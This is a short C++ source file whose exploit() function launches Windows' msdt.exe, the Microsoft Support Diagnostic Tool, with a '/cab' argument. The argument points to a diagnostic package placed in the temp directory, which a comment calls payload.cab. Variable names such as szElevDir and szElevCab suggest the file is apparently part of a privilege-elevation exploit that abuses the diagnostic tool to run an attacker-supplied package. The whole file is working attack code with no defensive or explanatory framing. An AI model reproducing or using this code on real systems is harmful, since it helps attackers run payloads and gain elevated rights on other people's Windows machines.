#include "Exploit.h"
#include <Windows.h>

void exploit()
{

	const char *szMSDTDir = "\\System32\\";
	const char *syMSDTExe = "msdt.exe";
	const char *szElevCab = "DiagPkg.diagcab";
	char szElevDir[MAX_PATH] = {};
	char szElevCabFull[MAX_PATH] = {};
	char szElevExeFull[MAX_PATH] = {};
	char temp_path[MAX_PATH] = {};
	char windir[MAX_PATH] = {};
	char szElevArgs[MAX_PATH] = {};

	GetWindowsDirectory(windir, MAX_PATH);
	GetTempPath(MAX_PATH, temp_path);
	
	/* %windir%\System32\ */
	_snprintf_s(szElevDir, MAX_PATH, "%s%s", windir, szMSDTDir);

	/* %windir%\system32\msdt.exe */
	_snprintf_s(szElevExeFull, MAX_PATH, "%s%s", szElevDir, syMSDTExe);

	/* %temp%\payload.cab */
	_snprintf_s(szElevCabFull, MAX_PATH, "%s%s", temp_path, szElevCab);

	/* /path dir - Just search for and execute whatever package is in the Low dir */
	_snprintf_s(szElevArgs, MAX_PATH, "/cab %s", szElevCabFull);
	
	if (CoInitialize(NULL) == S_OK)
	{
		/* Execute msdt.exe */
		SHELLEXECUTEINFO shinfo;
		ZeroMemory(&shinfo, sizeof(shinfo));
		shinfo.cbSize = sizeof(shinfo);
		shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		shinfo.lpFile = szElevExeFull;
		shinfo.lpParameters = szElevArgs;
		shinfo.lpDirectory = szElevDir;
		shinfo.nShow = SW_SHOW;

		if (ShellExecuteEx(&shinfo) && shinfo.hProcess != NULL)
		{
			CloseHandle(shinfo.hProcess);
		}												
	}
}